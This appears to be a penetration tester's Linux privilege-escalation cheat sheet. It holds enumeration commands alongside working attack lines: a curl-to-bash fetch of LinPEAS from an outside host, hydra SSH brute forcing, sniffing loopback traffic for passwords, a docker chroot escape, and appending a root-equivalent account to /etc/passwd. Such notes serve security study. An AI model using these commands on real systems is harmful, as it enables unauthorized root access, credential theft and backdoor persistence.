# linux privesc
please let me into the root fs, i am normal and can be trusted with knowledge of your drives

### // linux privesc checklist
```
Privilege Escalation - Linux

    If LinPEAS doesn’t return anything useful then it is possible you already have the information needed to privilege escalate. Try default passwords, priv esc with fail2ban, and other common tricks.
    Don’t forget to check for any Kernel exploits: uname -a
    For privilege escalation with fail2ban, use a Netcat shell or modify the permissions of /etc/shadow
    If there are no writable directories then just pipe LinPEAS (or other tool of choice) directly into bash: curl 10.10.10.1:8080/linpeas.sh | bash
    Run this command to identify possible privilege escalation efforts: which awk perl python ruby gcc cc vi vim nmap find netcat nc wget tftp ftp 2>/dev/null
    If you’ve identified a CronJob that may be exploitable then it may be worth plugging it into CronGuru.
    If spawning a shell, check all files for MySQL credentials. It is likely you will be able to privilege escalate once located. To login, ensure you have a stable shell and type mysql -u root -p
    If you are a member of the ‘Docker’ group then there are multiple opportunities for privilege escalation such as docker images and docker run -v /:/mnt --rm -it [IMAGE] chroot /mnt sh
    If breaking out of a restricted shell, ensure you check the local bin and then GTFOBins for any easy breakouts.
    Sometimes you will have to export your path after breaking out of a restricted shell. Use the following command to correct your path: export PATH=$PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

```

### // linux situational awareness
```
id
cat /etc/passwd
hostname
cat /etc/issue
cat /etc/os-release
uname -a
ps aux
ip a
routel
ss -anp
cat /etc/iptables/rules.v4
ls -lah /etc/cron*
crontab -l
sudo crontab -l
dpkg -l
find / -writable -type d 2>/dev/null
cat /etc/fstab
mount
lsblk
lsmod
/sbin/modinfo <kernel_module>
find / -perm -u=s -type f 2>/dev/null
```

### // user trails
```
env
cat .bashrc
// generate a custom wordlist based on potenital passwords
crunch <min> max<> -t <word>%%% > wordlist
// bruteforce w/ generated wordlist
hydra -l <user> -P wordlist <tgt_ip> -t 4 ssh -V
```

### // inspecting service footprints
```
watch -n 1 "ps -aux | grep pass"
sudo tcpdump -i lo -A | grep "pass"
```

### // abusing cron jobs
```
grep "CRON" /var/log/syslog
```

### // abusing password authentication
```
openssl passwd w00t
echo "root2:Fdzt.eqJQ4s0g:0:0:root:/root:/bin/bash" >> /etc/passwd
su root2
w00t
id
```

### // abusing setuid binaries and capabilities
```
// search for suid bins
https://gtfobins.github.io/
```

### // abusing sudo
```
// what can we run as sudo with our current user?
sudo -l
```

### // exploiting kernel vulnerabilities
```
cat /etc/issue
uname -r 
arch
searchsploit "linux kernel Ubuntu 16 Local Privilege Escalation"   | grep  "4." | grep -v " < 4.4.0" | grep -v "4.8"
```


